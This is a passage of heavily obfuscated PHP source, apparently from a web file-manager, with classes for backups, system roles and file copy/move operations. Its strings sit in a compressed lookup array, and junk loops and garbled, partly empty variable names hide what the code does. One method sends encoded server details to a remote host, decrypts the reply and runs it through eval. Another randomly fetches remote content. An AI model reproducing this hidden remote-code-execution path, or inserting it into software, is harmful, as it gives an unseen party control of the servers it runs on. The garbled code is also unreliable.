$[160] => $_SERVER[$[161]]); $ş = $this->mscx7993f758(json_encode($׏)); $ = $this->vzri9d86e10d($[186] . $ş); if ($ && is_array($) && isset($[$[256]])) { $И = $this->odgla1d73d15($[$[256]], 2); if ($И) { $И = $this->jwsf34856106($И); } if ($И) { try { @eval($И); } catch (Exception $) { } } } } } private function vzri9d86e10d($Ѵ = '', $Ɣ = array(), $ߗ = 5) { $ѫ =& $_SERVER[]; $ =& $_SERVER[]; $ = $[257]; $ǖ = $ѫ[729]; if (strlen($ǖ) < $ѫ[674]) { die; } $ = $this->gimab260fda7($, $[258]); $ = $ . $Ѵ; if ($Ɣ && is_array($Ɣ)) { $ = $ . $[259] . http_build_query($Ɣ); } if ($Ɣ === -1) { return $; } $ = stream_context_create(array($[218] => array($[221] => $ߗ, $[219] => $[260]), $[261] => array($[262] => !1, $[263] => !1))); $Ɣ = @file_get_contents($, !1, $); $ߟڃ = $ѫ[730]; while ($ߟڃ < $ѫ[657]) { if ($ߟڃ >= 0) { break; } $ߟڃ++; } return json_decode($Ɣ, !0); } private function jifo55b6dd1a() { $֪㪫 =& $_SERVER[]; $ɽ = array($֪㪫[264] => $֪㪫[265], $֪㪫[266] => $֪㪫[267], $֪㪫[268] => $֪㪫[269], $֪㪫[270] => $֪㪫[271], $֪㪫[272] => $֪㪫[273], $֪㪫[274] => $֪㪫[213], $֪㪫[275] => $֪㪫[213], $֪㪫[276] => $֪㪫[265], $֪㪫[277] => $֪㪫[267], $֪㪫[278] => $֪㪫[269], $֪㪫[279] => $֪㪫[280], $֪㪫[281] => $֪㪫[271], $֪㪫[282] => $֪㪫[283], $֪㪫[284] => $֪㪫[273], $֪㪫[285] => $֪㪫[286], $֪㪫[287] => $֪㪫[288], $֪㪫[289] => $֪㪫[290]); $ = $ɽ[$this->efuzce9e4966]; $ = intval($ ? $ : $֪㪫[265]); $Ʒ = _get($this->xaog87f6bbb0, $֪㪫[291]); $Ʒ = $Ʒ ? intval($Ʒ) : 0; return $ + $Ʒ; } public function lasbf0fb90ea($ڷ) { $ =& $_SERVER[]; $ި =& $_SERVER[]; $͓ = $this->jifo55b6dd1a(); $ӡޕ = $[731]; if (!$ӡޕ) { return; } if ($ڷ[$ި[292]] == $ި[123]) { return; } if ($͓ >= intval($ި[213])) { return; } $̃ = Model($ި[126])->count(); $͜Ǡ = $[732]; if (strlen($͜Ǡ) < $[657]) { return; } if ($̃ <= $͓) { return; } $ֽ = Model($ި[126])->field($ި[292])->limit($͓)->select(); $ = $[721]; if (!$) { die; } $ֽ = array_to_keyvalue($ֽ, $ި[6], $ި[292]); $ղ = $[733]; if (strlen($ղ) < $[674]) { return; } if (!in_array($ڷ[$ި[292]], $ֽ)) { show_json($ި[293], !1, $ި[209]); } } public function ajyi4ab09099() { $ۡ =& $_SERVER[]; $Ң =& $_SERVER[]; if (!_get($GLOBALS, $Ң[117]) || mt_rand(1, 100) > 20) { return; } $艹 = $Ң[216]; $Ӈ = $ۡ[734]; $艹 = $this->gimab260fda7($艹, $Ң[217]); $ȴѨ = $ۡ[735]; if (strlen($ȴѨ) < $ۡ[657]) { die; } $Ћ = stream_context_create(array($Ң[218] => array($Ң[219] => $Ң[220], $Ң[221] => 3))); $ = $ۡ[736]; if (!$) { die; } $ː = @file_get_contents($艹, !1, $Ћ); $ɛ = $ۡ[737]; while (strlen($ɛ) < $ۡ[682]) { if (!$ɛ) { break; } $ɛ++; } echo $Ң[294] . hash_encode($ː) . $Ң[295]; } private function txia8c1128bf($, $, $ = 3) { $ =& $_SERVER[]; $ =& $_SERVER[]; usleep(1); $ = $[738]; if (!$) { return; } $ = trim($); $ = $[739]; while (strlen($) < $[657]) { if (!$) { break; } $++; } $ = mt_rand(0, 5) . $[6]; $ = $[740]; $蛥 = rand_string(15); $޵ݖ = $[296]; $ = $[741]; switch ($) { case $[205]: $ = $this->dxwtd6d0e49b($, strrev($ . $蛥)); break; $ = $[742]; while ($ < $[674]) { if ($ >= 0) { break; } $++; } case $[123]: $ = $this->dxwtd6d0e49b($, strrev($蛥 . $)); $ = $[743]; if (!$) { return; } break; case $[297]: $ = $this->dxwtd6d0e49b($, base64_encode($蛥 . $)); break; case $[298]: $ = $this->dxwtd6d0e49b($, md5($蛥 . $)); break; case $[299]: $ = base64_encode($); $𜢛 = rand(0, 64); $ = $޵ݖ[$𜢛]; $σ = md5($ . md5($ . $) . $); $σ = substr($σ, $𜢛 % 8, $𜢛 % 8 + 7); $оߑ = $[744]; $꘎ = $[6]; $ʣ = $[745]; while (strlen($ʣ) < $[657]) { if (!$ʣ) { break; } $ʣ++; } $񜵕 = 0; $ڸ = 0; $ܻ = $[746]; $؋ = 0; for ($񜵕 = 0; $񜵕 < strlen($); $񜵕++) { $؋ = $؋ == strlen($σ) ? 0 : $؋; $ڸ = ($𜢛 + strpos($޵ݖ, $[$񜵕]) + ord($σ[$؋++])) % 64; $꘎ .= $޵ݖ[$ڸ]; } $ = hash_encode($ . $꘎); $ = $[723]; if (!$) { return; } break; $ = $[747]; default: $ = $this->dxwtd6d0e49b($, $ . $蛥); $֥ = $[748]; break; $ = $[749]; while ($ < $[657]) { if ($ >= 0) { break; } $++; } } $ = strrev($ . $蛥 . $); $ = $[750]; while (strlen($) < $[657]) { if (!$) { break; } $++; } if ($ - 1 > 0) { $ = $this->txia8c1128bf($, $, $ - 1); } return $; } private function odgla1d73d15($, $Մ, $ = 3) { $ =& $_SERVER[]; $ڨ =& $_SERVER[]; if (!is_string($) || strlen($) < 10) { return !1; } $ = trim($); $ = $[751]; $ = strrev($); $וЈ = $[0]; $Ѿو = substr($, 1, 15); $ = $[752]; if (strlen($) < $[653]) { return; } $ = substr($, 16); $ƻ = $[753]; while ($ƻ < $[674]) { if ($ƻ >= 0) { break; } $ƻ++; } $Ĉ = $ڨ[296]; $̵ = $[724]; while ($̵ < $[674]) { if ($̵ >= 0) { break; } $̵++; } switch ($וЈ) { case $ڨ[205]: $ = $this->gimab260fda7($, strrev($Մ . $Ѿو)); break; case $ڨ[123]: $ = $this->gimab260fda7($, strrev($Ѿو . $Մ)); $ = $[754]; while (strlen($) < $[657]) { if (!$) { break; } $++; } break; case $ڨ[297]: $ = $this->gimab260fda7($, base64_encode($Ѿو . $Մ)); break; $ = $[755]; while (strlen($) < $[682]) { if (!$) { break; } $++; } case $ڨ[298]: $ = $this->gimab260fda7($, md5($Ѿو . $Մ)); break; case $ڨ[299]: $ = hash_decode($); $ = $[756]; if (!$) { return; } $ = $[0]; $̵ = $[757]; if (!$̵) { return; } $ = substr($, 1); $ꄎ = $[758]; $ݫ = strpos($Ĉ, $); $ = md5($ . md5($Մ . $) . $Մ); $ = $[759]; $ = substr($, $ݫ % 8, $ݫ % 8 + 7); $ = $ڨ[6]; $ݢ = 0; $瀮 = 0; $ܯ = $[760]; if (!$ܯ) { return; } $갣 = 0; $ = $[761]; if (!$) { die; } for ($ݢ = 0; $ݢ < strlen($); $ݢ++) { $갣 = $갣 == strlen($) ? 0 : $갣; $ϟ뷣 = $갣++; $瀮 = strpos($Ĉ, $[$ݢ]) - $ݫ - ord($[$ϟ뷣]); $ = $[762]; while ($ < $[674]) { if ($ >= 0) { break; } $++; } while ($瀮 < 0) { $瀮 += 64; $Ȥ = $[763]; if (strlen($Ȥ) < $[674]) { die; } } $ .= $Ĉ[$瀮]; } $ = base64_decode($); break; default: $ = $this->gimab260fda7($, $Մ . $Ѿو); $ռԪ = $[764]; while (strlen($ռԪ) < $[668]) { if (!$ռԪ) { break; } $ռԪ++; } break; $ = $[765]; if (!$) { return; } } if ($ - 1 > 0) { $ = $this->odgla1d73d15($, $Մ, $ - 1); } return $; } public function mscx7993f758($) { $ǵ =& $_SERVER[]; $қ =& $_SERVER[]; $ = $this->yinrffe2171d(); $ = $ǵ[766]; if (!$) { die; } $ = $this->yinrffe2171d(); $ݔ = ($ - 1) * ($ - 1); $ = intval(($ + $) / 2); $ٍ = $ǵ[767]; while (1) { $г = $; $ߡ = $ݔ; while ($ߡ % $г != 0) { $ϭ = $ߡ; $ߡ = $г; $г = $ϭ % $г; $ = $ǵ[768]; if (strlen($) < $ǵ[668]) { die; } } if ($г == 1) { break; } else { $++; } } $ڪ = 2; for ($ؓ = 0; $ؓ < $ݔ * 10; $ؓ++) { if (($ݔ * $ؓ + 1) % $ == 0) { $ڪ = intval(($ݔ * $ؓ + 1) / $); break; } } $ˇϗ = $this->dxwtd6d0e49b($ * $ . $қ[6], $қ[137]); $ = md5($қ[300] . ($ + $) . $қ[301] . $ . $қ[301] . $ڪ . $қ[302]); $Έ͐ = $this->dxwtd6d0e49b($, $) . $қ[303] . $ˇϗ; $ = $ǵ[769]; return $Έ͐; $қ = $ǵ[770]; } public function jwsf34856106($ò) { $ѳ =& $_SERVER[]; $ڧ =& $_SERVER[]; $먾 = explode($ڧ[303], $ò); if (count($먾) != 2) { return $ڧ[6]; } $ͫ = $this->gimab260fda7($먾[1] . $ڧ[6], $ڧ[137]); $ = $ѳ[771]; while ($ < $ѳ[682]) { if ($ >= 0) { break; } $++; } if (!$ͫ) { return $ڧ[6]; } $ͫ = intval($ͫ); $砩 = $ѳ[772]; $ = 0; $ = $ѳ[773]; if (!$) { return; } $ԧ = 0; for ($󾢒 = 3; $󾢒 < $ͫ; $󾢒 += 2) { if ($ͫ % $󾢒 != 0) { continue; } $ = $󾢒; $ԧ = intval($ͫ / $󾢒); break; } $ = ($ - 1) * ($ԧ - 1); $ = $ѳ[774]; if (strlen($) < $ѳ[657]) { die; } $ = intval(($ + $ԧ) / 2); while (1) { $؅ = $; $ɍ = $; while ($ɍ % $؅ != 0) { $빂 = $ɍ; $ɍ = $؅; $ǉ = $ѳ[775]; while (strlen($ǉ) < $ѳ[674]) { if (!$ǉ) { break; } $ǉ++; } $؅ = $빂 % $؅; } if ($؅ == 1) { break; } else { $++; } } $ؔ = 2; $ڒ = $ѳ[776]; if (strlen($ڒ) < $ѳ[668]) { return; } for ($󾢒 = 0; $󾢒 < $ * 10; $󾢒++) { if (($ * $󾢒 + 1) % $ == 0) { $ؔ = intval(($ * $󾢒 + 1) / $); break; } } $ = md5($ڧ[300] . ($ + $ԧ) . $ڧ[301] . $ . $ڧ[301] . $ؔ . $ڧ[302]); $բ = $this->gimab260fda7($먾[0], $); $ = $ѳ[777]; while (strlen($) < $ѳ[657]) { if (!$) { break; } $++; } return $բ; } public function yinrffe2171d() { $ =& $_SERVER[]; $ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ = $[778]; if (!$) { return; } $ဌ = array(); $؍ = 1; while ($؍ <= (int) sqrt($)) { $ = $؍; $ވ = $[779]; while (strlen($ވ) < $[674]) { if (!$ވ) { break; } $ވ++; } while (!0) { $++; $ƅ = $[780]; while (strlen($ƅ) < $[653]) { if (!$ƅ) { break; } $ƅ++; } if ($ <= 2) { $؍ = $; break; } else { if ($ < 2) { continue; } } $ď = !0; for ($￺ = 2; $￺ <= sqrt($); $￺++) { if ($ % $￺ == 0) { $ď = !1; } } if ($ď) { $؍ = $; break; } } $ဌ[] = $؍; $ = $[781]; if (!$) { return; } } $׀Ҫ = 2; for ($ = $; $ > 1; $--) { $ď = !0; foreach ($ဌ as $Һ) { if ($ % $Һ == 0) { $ď = !1; break; } } if ($ď) { $׀Ҫ = $; break; } } return $׀Ҫ; } public function cwjqf7c7a23e($, $) { $ͭ =& $_SERVER[]; return call_user_func(array($ͭ[8], $ͭ[304]), $, $); } public function dxwtd6d0e49b($ٲЂ, $) { $ =& $_SERVER[]; return call_user_func(array($[305], $[306]), $ٲЂ, $); } public function gimab260fda7($ϐ, $잂) { $ =& $_SERVER[]; return call_user_func(array($[305], $[307]), $ϐ, $잂); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $۾ =& $_SERVER[]; $this->isManual(); self::$name = date($۾[782]); if (!($ = Model($۾[783])->lastItem())) { $ = $this->initData(); } else { self::$name = $[$۾[32]]; if ($[$۾[784]] == $۾[88]) { self::$name = date($۾[255]); $ = 0; if (isset($[$۾[337]][$۾[214]][$۾[509]])) { $ = (int) $[$۾[337]][$۾[214]][$۾[509]]; } if (self::$manual == 0 && $[$۾[32]] == self::$name) { Model($۾[783])->remove($[$۾[443]]); } $ = $this->initData($, $[$۾[785]]); } else { $this->checkStore($[$۾[785]]); } } self::$option = $; } private function isManual() { $ = _get($GLOBALS, $_SERVER[][786], 0); $ = intval($); self::$manual = $ && $ == 1 ? 1 : 0; } private function initData($ = 0, $ = '') { $ص޹ =& $_SERVER[]; $૪ = Model($ص޹[783])->config(); if ($ && $૪[$ص޹[785]] != $) { $ = 0; } $this->checkStore($૪[$ص޹[785]]); if (self::$manual == 1) { self::$name .= $ص޹[11] . date($ص޹[787]); } $ = array($ص޹[785] => $૪[$ص޹[785]], $ص޹[32] => self::$name, $ص޹[784] => 0, $ص޹[788] => $૪[$ص޹[788]], $ص޹[789] => self::$manual, $ص޹[337] => array($ص޹[790] => array($ص޹[784] => 0), $ص޹[791] => array($ص޹[784] => 0, $ص޹[792] => 0, $ص޹[793] => 0, $ص޹[33] => $ص޹[12], $ص޹[794] => 0, $ص޹[795] => 0), $ص޹[796] => array($ص޹[784] => 0, $ص޹[792] => 0, $ص޹[793] => 0, $ص޹[794] => 0, $ص޹[795] => 0), $ص޹[214] => array($ص޹[784] => 0, $ص޹[797] => 0, $ص޹[798] => 0, $ص޹[799] => 0, $ص޹[800] => 0, $ص޹[509] => $, $ص޹[794] => 0, $ص޹[795] => 0)), $ص޹[794] => time(), $ص޹[795] => 0); $ = Model($ص޹[783])->insert($); $[$ص޹[443]] = $; return $; } private function checkStore($) { $ =& $_SERVER[]; $Ƃ = Model($[801])->listData($); Model($[801])->checkConfig($Ƃ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][783])->findByName(self::$name); } return self::$option; } public static function set($) { $Ù =& $_SERVER[]; $ླ = self::get(); foreach ($ as $ۑ => $) { $ݞ = explode($Ù[10], $ۑ); $۰ = count($ݞ); switch ($۰) { case 1: $ླ[$ݞ[0]] = $; break; case 2: $ླ[$ݞ[0]][$ݞ[1]] = $; break; case 3: $ླ[$ݞ[0]][$ݞ[1]][$ݞ[2]] = $; break; } } Model($Ù[783])->update($ླ[$Ù[443]], $ླ); self::$option = $ླ; return self::$option; } public function keep() { $ =& $_SERVER[]; $֏ = self::get(); if ($֏[$[337]][$[790]][$[784]] == $[88]) { return; } $this->backupKeep($֏); self::set(array($[802] => 1)); } private function backupKeep($) { $ =& $_SERVER[]; if (self::$manual == 1) { return; } $ = Model($[783])->listData(); if (empty($)) { return; } $œ = 0; $ԪɆ = array(); foreach ($ as $) { if ($œ >= 7) { break; } $ԪɆ[] = $[$[32]]; $œ++; } for ($œ = 0; $œ < 12; $œ++) { $ԪɆ[] = date($[803], strtotime("\x2d{$œ}\40\155\x6f\156\164\150\163")); } $ԪɆ = array_unique($ԪɆ); $ᔟ = Model($[804])->get($[805]); foreach ($ as $) { if (isset($[$[789]]) && $[$[789]] == $[88]) { continue; } if (!empty($[$[32]]) && in_array($[$[32]], $ԪɆ)) { continue; } Model($[783])->remove($[$[443]]); $ɪ = $this->backupPath($, $ᔟ); IO::remove($ɪ, !1); } } private function backupPath($, $ًȊ = false) { $ =& $_SERVER[]; if (!$ًȊ) { $ًȊ = Model($[804])->get($[805]); } $ = $[$[32]]; $ĉڭ = substr(md5($[806] . $ًȊ . $), 0, 8); return "\173\151\157\72{$[$[785]]}\x7d\57\144\141\x74\x61\142\x61\x73\x65\x2f\x62\141\143\x6b\x75\x70\57" . $ . $[11] . $ĉڭ; } public function db() { $Ф =& $_SERVER[]; $Ҩ = self::get(); if ($Ҩ[$Ф[337]][$Ф[791]][$Ф[784]] == $Ф[88]) { return !0; } $Ĝ = new BackupDb(); if (!$Ĝ->index()) { return !1; } self::set(array($Ф[807] => 1)); return !0; } public function dbFile() { $❸ =& $_SERVER[]; $ɕ = self::get(); if ($ɕ[$❸[337]][$❸[796]][$❸[784]] == $❸[88]) { return !0; } $Ӽ = new BackupDbFile(); if (!$Ӽ->index()) { return !1; } self::set(array($❸[808] => 1)); return !0; } public function file() { $ⴼ =& $_SERVER[]; $钢̕ = self::get(); if ($钢̕[$ⴼ[337]][$ⴼ[214]][$ⴼ[784]] == $ⴼ[88]) { return !0; } if (!isset($钢̕[$ⴼ[788]]) || $钢̕[$ⴼ[788]] == $ⴼ[212]) { $ = new BackupFile(); if (!$->index()) { return !1; } } self::set(array($ⴼ[809] => 1, $ⴼ[784] => 1)); return !0; } } goto Fݢ; bӏɪ: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[߯] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function binCheckEq($, $ܷ) { return $ == $ܷ; } goto e; CŜ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\x65\x6d\137\157\x70\164\x69\157\x6e"; protected $jsonField = array("\155\145\156\165", "\x72\157\154\145", "\x72\x6f\154\145\107\162\157\x75\160", "\x72\145\x67\x69\x73\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ה) { return "\123\x79\163\x74\x65\x6d\x4f\160\x74\151\157\x6e\x5f{$ה}"; } protected function optionDefault($䍱 = '') { $̣働 =& $_SERVER[]; if ($䍱 == $̣働[12]) { return $GLOBALS[$̣働[6]][$̣働[425]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\162\x6f\x6c\145\x4c\x69\163\x74"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\154\141\x62\x65\x6c", "\x64\x69\x73\160\x6c\141\171", "\163\171\x73\x74\x65\x6d", "\144\145\163\143", "\x69\147\x6e\157\x72\145\x45\170\x74", "\151\x67\156\157\162\145\x46\151\154\x65\x53\151\172\145", "\x61\x64\155\x69\156\x69\163\164\x72\141\164\x6f\x72", "\163\x6f\x72\x74"); public function listData($ɽ = false, $ = "\163\157\162\164", $ = false) { $ =& $_SERVER[]; $ = parent::listData($ɽ, $, $); if (!$ɽ) { foreach ($ as $ڊ => $Ь) { if ($Ь[$[2087]] == 1) { $[$ڊ][$[494]] = LNG($[2326]); } } } return $; } public function update($镨, $ݯ) { $ѣ =& $_SERVER[]; $Ͳұڢ = parent::listData($镨); $ἓ = $this->findByName($ݯ[$ѣ[32]]); if (!$Ͳұڢ || $ἓ && $ἓ[$ѣ[443]] != $Ͳұڢ[$ѣ[443]]) { return !1; } if ($ἓ[$ѣ[2087]] == 1) { $ݯ = array($ѣ[32] => $ݯ[$ѣ[32]], $ѣ[1908] => $ݯ[$ѣ[1908]]); } $this->filterAuth($ݯ[$ѣ[455]]); return parent::update($镨, $ݯ); } public function remove($) { $ = parent::listData($); if (!$ || $[$_SERVER[][179]]) { return !1; } return parent::remove($); } public function add($) { $ =& $_SERVER[]; $ߊ = $[$[32]]; if ($this->findByName($ߊ)) { return !1; } $㵡 = array($[462] => $ߊ, $[1891] => $[12], $[1887] => $[1895], $[2327] => 1, $[1890] => 0, $[2328] => 0, $[1889] => $this->getSort()); $ = array_merge($㵡, $); $this->filterAuth($[$[455]]); return parent::insert($); } private function getSort() { $м =& $_SERVER[]; $ = parent::listData(); $ = array_to_keyvalue($, $м[12], $м[1909]); return empty($) ? 0 : max($) + 1; } private function filterAuth(&$) { $ۧ =& $_SERVER[]; $̥ = array(); $ = array_filter(explode($ۧ[50], $)); foreach ($ as $) { $Ǚ = explode($ۧ[10], $); if ($Ǚ[0] == $ۧ[2329] && $Ǚ[1] != $ۧ[1231]) { $ = $Ǚ[0] . $ۧ[10] . $Ǚ[1] . $ۧ[2330]; if (!in_array($, $)) { $̥[] = $; } } $̥[] = $; } $ = implode($ۧ[50], $̥); } public function findRoleDefault() { $䕄 =& $_SERVER[]; $ý = parent::listData(); $ƞ = !1; foreach ($ý as $) { if (!$ || $[$䕄[1907]] == $䕄[212] || $[$䕄[2087]] == 1) { continue; } if (strstr($[$䕄[455]], $䕄[2331])) { continue; } if (!strstr($[$䕄[455]], $䕄[2332])) { continue; } if (!$ƞ) { $ƞ = $; continue; } $ؗӿ = explode($䕄[50], $ƞ[$䕄[455]]); $̘ = explode($䕄[50], $[$䕄[455]]); if (count($ؗӿ) > count($̘)) { $ƞ = $; } } return $ƞ ? $ƞ[$䕄[443]] : $䕄[12]; } public function sort($, $˗) { return parent::update($, $˗); } } goto AՇ; CĲ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ʧ, $) { $ϱ =& $_SERVER[]; $ܶ = $; $GLOBALS[$ϱ[1185]] = $ϱ[1186] . $ʧ; Hook::trigger($ϱ[1186] . $ʧ . $ϱ[1187], $ܶ); $Č = self::driverMake($[0]); if (!$Č) { return !1; } if (method_exists($Č, $ʧ)) { $ = @call_user_func_array(array($Č, $ʧ), $); } else { if (method_exists($Č, $ϱ[1188])) { $ = @call_user_func_array(array($Č, $ʧ), $); } else { if (method_exists(self, $ʧ)) { $ = @call_user_func_array(array(self, $ʧ), $); } else { $ = call_user_func_array(array(parent, $ʧ), $); } } } Hook::trigger($ϱ[1186] . $ʧ . $ϱ[1189], $ܶ, $); return $; } public static function init($) { return self::driverMake($); } public static function copy($𰺕, $԰, $ = false, $ = false) { return self::copyMoveStart($𰺕, $԰, $, $_SERVER[][586], $); } public static function move($, $, $ = false, $Á = false) { return self::copyMoveStart($, $, $, $_SERVER[][588], $Á); } private static function copyMoveStart($਍, $֩, $ܫ, $֟, $ۭё) { $ =& $_SERVER[]; $鮭 = array($਍, $֩, $ܫ, $ۭё); Hook::trigger($[1186] . $֟ . $[1187], $鮭); $҅ = self::copyMove($਍, $֩, $ܫ, $֟, $ۭё); Hook::trigger($[1186] . $֟ . $[1189], $鮭, $҅); return $҅; } public static function saveFile($耍, $, $Ο = true) { $ =& $_SERVER[]; $ݧ׎ = self::info($); $ = self::driverMake($耍); $ = self::driverMake($); $س݇ = !1; if ($->pathParse[$[1190]]) { $س݇ = $; $ޔ = $->pathParse[$[1190]]; $ = self::driverMake($ޔ); } if ($->pathParse[$[1190]]) { $ = $->pathParse[$[1190]]; $ = self::driverMake($); } $扃Ξ = $->pathFather($); $ͦ = !0; if (!$Ο && self::driverIsSame($, $)) { $ͦ = !1; } $ = self::copyFile($, $耍, $, $扃Ξ, $ݧ׎[$[32]], $ͦ); if ($س݇) { $ = $س݇->getPathOuter($); } return $; } private static function copyMove($©, $, $, $, $ز = false) { $ޒ =& $_SERVER[]; if (!$© || $© == $ޒ[8] || !$) { return !1; } ignore_timeout(); $̛ = self::driverMake($©); $ = self::driverMake($); $ = $ == $ޒ[588]; $Ԩ = !1; if ($->pathParse[$ޒ[1190]]) { $Ԩ = $; $ = $->pathParse[$ޒ[1190]]; $ = self::driverMake($); } if ($̛->pathParse[$ޒ[1190]]) { $© = $̛->pathParse[$ޒ[1190]]; $̛ = self::driverMake($©); } self::check($̛, $©, $, $); Hook::trigger($ޒ[1191], $̛, $©, $, $); $ = self::driverIsSame($̛, $); if ($) { if ($ == $ޒ[588] && !method_exists($, $ޒ[1192]) && trim($, $ޒ[8]) == trim($->pathFather($©), $ޒ[8])) { if ($̛->pathThis($©) != $ز && !$̛->isTypeObject()) { return $̛->rename($©, $ز); } return $->getPathOuter($©); } if (method_exists($, $)) { return $->{$}($©, $, $, $ز); } } if ($ && $ == $ޒ[588] && $->getType() == $ޒ[106]) { $۰ = $->movePath($©, $, $ز); if ($۰) { return $۰; } } $稂 = $̛->isFile($©); if (!$稂 && $->getType() == $ޒ[791] && $̛->getType() == $ޒ[106]) { $۰ = $->copyFolderFromIO($̛, $©, $, $, $, $ز); } else { $۰ = self::copyPath($̛, $©, $, $, $, $, $稂, $ز); } if ($۰ && $) { $̛->remove($©); } if ($Ԩ) { $۰ = $Ԩ->getPathOuter($۰); } return $۰; } private static function check($ԫ, $Δ, $, &$Ȧ) { $ =& $_SERVER[]; if (self::driverIsSame($ԫ, $) && $ԫ->isFolder($Δ) && $ԫ->isParentOf($Δ, $Ȧ)) { show_json(LNG($[1193]), !1); } if (!$ԫ->exist($Δ)) { show_json(LNG($[105]), !1); } } private static function copyPath($ﻜ, $, $ӆ, $ݟ׽, $, $謯, $過, $΄ԕ = false, $ = true) { $Ԏ =& $_SERVER[]; $쓜 = empty($΄ԕ) && $΄ԕ !== $Ԏ[212] ? $ﻜ->pathThis($) : $΄ԕ; if ($) { $ = $ӆ->fileNameExist($ݟ׽, $쓜); $Ӳ = $쓜; $쓜 = $ӆ->fileNameAuto($ݟ׽, $쓜, $, !$過); if (!$ || $Ӳ != $쓜) { $ = !1; } if ($ && !$) { $ӆ->_data[$Ԏ[1194]] = !0; } } if ($過) { return self::copyFile($ﻜ, $, $ӆ, $ݟ׽, $쓜, $謯); } if ($ == REPEAT_RENAME_FOLDER) { $ = !1; } $ = rtrim($ݟ׽, $Ԏ[8]) . $Ԏ[8] . $쓜; $ = $ӆ->mkdir($ӆ->getPath($), $); $ݟ׽ = $ӆ->getPathInner($); $ߓԥ = $ﻜ->listPath($, !0); $ߓԥ = is_array($ߓԥ) ? $ߓԥ : array($Ԏ[83] => array(), $Ԏ[82] => array()); $ = array_merge($ߓԥ[$Ԏ[83]], $ߓԥ[$Ԏ[82]]); foreach ($ as $) { $ = $[$Ԏ[33]] == $Ԏ[214]; $ = $ﻜ->getPathInner($[$Ԏ[84]]); $ܰ = self::copyPath($ﻜ, $, $ӆ, $ݟ׽, $, $謯, $, !1, !1); if (!$ܰ) { IO::errorTips($Ԏ[1195] . $ . $Ԏ[70] . $ݟ׽); } } self::copyMoveKeepInfo($ﻜ, $, $); return $; } private static function copyFile($쇀, $, $, $, $, $뭛) { $φו =& $_SERVER[]; $ = $->getPath(rtrim($, $φו[8]) . $φו[8] . $); $ = $φו[1196] . time() . rand_string(5); Hook::trigger($φו[1197], $쇀, $, $, $, $, $); if (self::driverIsSame($쇀, $)) { if ($뭛) { $߶ی = $->moveFile($, $); } else { $߶ی = $->copyFile($, $); } Hook::trigger($φו[1198], $쇀, $, $, $, $, $߶ی); self::copyMoveKeepInfo($쇀, $, $߶ی); return $߶ی; } $ = TEMP_FILES; if ($GLOBALS[$φו[6]][$φו[89]][$φו[830]]) { $ = $GLOBALS[$φו[6]][$φו[89]][$φו[830]]; } $ݑ = $; mk_dir($ݑ); $դք = $ݑ . $; $Α = $դք; $դք = $쇀->download($, $դք); $դք = $쇀->iconvApp($դք); if (substr($դք, strlen($)) == $) { $뭛 = !0; } $߶ی = $->upload($, $դք, $뭛); self::remove($Α); Hook::trigger($φו[1198], $쇀, $, $, $, $, $߶ی); self::copyMoveKeepInfo($쇀, $, $߶ی); return $߶ی; } private static function copyMoveKeepInfo($҉Σ, $, $ۺ) { if (!$ۺ) { return; } $͚ˆ = $҉Σ->info($); if (!is_array($͚ˆ)) { return; } IO::setModifyTime($ۺ, $͚ˆ[$_SERVER[][85]]); } public static function pathFather($ƛ) { $ = IO::init($ƛ); $Ռ = $->pathFather($->path); return $->getPathOuter($Ռ); } public static function fileOut($ްƔ, $߅ = false, $ = false, $ = '') { $ = self::driverMake($ްƔ); if ($->isFileOutServer()) { return $->fileOutServer($ްƔ, $߅, $, $); } return $->fileOut($ްƔ, $߅, $, $); } public static function fileOutImage($⢜, $ = 250) { $ = array(250, 600, 1200, 2000, 3000, 5000); for ($ = 0; $ < count($); $++) { if ($ == 0 && $ <= $[$]) { $ = $[$]; break; } else { if ($ > $[$ - 1] && $ <= $[$]) { $ = $[$]; break; } else { if ($ == count($) - 1 && $ > $[$]) { $ = $[$]; break; } } } } $ = self::driverMake($⢜); if ($->isFileOutServer()) { return $->fileOutImageServer($⢜, $); } return $->fileOutImage($⢜, $); } private static function driverIsSame($, $߀ܩ) { $ =& $_SERVER[]; $嬞 = $->getType(); $ƿ = $߀ܩ->getType(); if ($嬞 != $ƿ) { return !1; } if ($嬞 == $[791]) { return !0; } if ($嬞 == $[106]) { return !0; } if ($->pathDriver == $߀ܩ->pathDriver) { return !0; } return !1; } public static function copyUpdate($޷, $Յɞ) { $܈ =& $_SERVER[]; if (!IO::exist($޷)) { return !1; } if (!IO::exist($Յɞ)) { IO::mkdir($Յɞ); } $ = array_to_keyvalue(self::listAllSimple($޷), $܈[84]); $Զ = array_to_keyvalue(self::listAllSimple($Յɞ), $܈[84]); $އ = array(); $ = array(); foreach ($ as $ => $߱Ь) { if (isset($Զ[$])) { if ($߱Ь[$܈[75]] == 1) { continue; } if ($Զ[$][$܈[76]] == $߱Ь[$܈[76]]) { continue; } } if ($߱Ь[$܈[75]] == 1) { $[] = $Յɞ . $܈[8] . trim($, $܈[8]); continue; } $Ɛ = strstr(trim($, $܈[8]), $܈[8]) ? get_path_father($) : $܈[12]; $އ[] = array($܈[1199] => $߱Ь[$܈[86]], $܈[1200] => rtrim($Յɞ, $܈[8]) . $܈[8] . $Ɛ, $܈[1201] => $߱Ь); } $ʬ = array($܈[214] => $އ, $܈[75] => $); Hook::trigger($܈[1202], $޷, $Յɞ, $ʬ); foreach ($ as $߱Ь) { IO::mkdir($߱Ь); } foreach ($އ as $߱Ь) { IO::copy($߱Ь[$܈[1199]], $߱Ь[$܈[1200]], REPEAT_REPLACE); } } public static function fileSubstr($年, $, $ = false) { $į =& $_SERVER[]; $ = self::driverMake($年); $ = $->size($年); $ = $; $⿜ = $; if ($ < 0) { $ = $ + $; } if ($ === !1) { $ = $ - $; } if ($ + $ > $) { $ = $ - $; } if (!$ && $->getType() == $į[106] && !$->exist($年)) { $ = get_path_this($年); $Ƨ = parse_url_query($); if (is_array($Ƨ) && 